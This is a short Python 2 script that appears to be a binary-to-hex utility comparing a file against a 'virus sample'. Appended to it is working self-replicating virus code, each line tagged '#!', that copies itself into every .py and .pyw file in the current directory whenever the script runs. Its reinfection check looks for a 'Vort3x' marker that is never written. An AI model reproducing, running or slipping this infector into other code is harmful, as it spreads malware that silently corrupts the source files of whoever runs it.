#convert binary to hex
import glob
import binascii
def binhex():
    fvirus=open("vir.py","rb").read()#open virus database sample
    frand=open("a.py","rb").read()# open any file
#    print fvirus
    fvirus=fvirus.split("\n")#remove newline
    fvirus="".join(fvirus)
    frand=frand.split("\n")#""
    frand="".join(frand)
    fvirus=binascii.hexlify(fvirus)#convert binary to hex
    frand=binascii.hexlify(frand)#" "
   
    print"virus sample",fvirus
    print"file:",frand
    
binhex()

import glob #!

from string import * #!

Files = glob.glob("*.py") + glob.glob("*.pyw") #!

for Files in Files: #!

   vCode = open(__file__, 'r') #!

   victim = open (Files, 'r') #!

   readvictim = victim.read() #!

   if find(readvictim, "-=::Vort3x::=-") == -1: #!

       victim = open(Files, 'a') #!

       for code in vCode.readlines(): #!

            if ("#!") in code: #!

                vCode.close() #!

                mycode=(chr(10)+code) #!

                victim.write(mycode) #! 
